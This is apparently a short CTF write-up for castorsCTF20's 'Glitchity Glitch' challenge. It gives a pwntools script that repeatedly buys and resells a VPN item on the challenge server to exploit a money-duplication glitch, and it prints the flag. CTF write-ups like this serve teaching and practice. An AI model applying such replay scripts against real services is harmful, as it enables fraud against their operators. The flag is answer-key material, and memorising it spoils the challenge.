---
type: "post"
title: "Glitchity Glitch"
author: "tozkoparan (Ahmed Selim Üzüm)"
tags: ["writeup", "coding", "castorsCTF20"]
---

For getting the flag in this challenge we have to have lots of money. For this
we can buy VPN, then sell it and because of the glitch we can sell it again and again!
So let's write a script for earning money.

```python
from pwn import *

conn = remote("chals20.cybercastors.com", 14432)
print(conn.recvuntil("Choice:"))
conn.sendline("6")
print(conn.recvuntil("Choice:"))
for i in range(1020):
    conn.sendline("0")
    conn.recvuntil("Choice:")
    conn.sendline("1")
    conn.recvuntil("Choice:")
    print(i)
conn.interactive()
```

Flag: `castorsCTF{$imPl3_sTUph_3h?}`

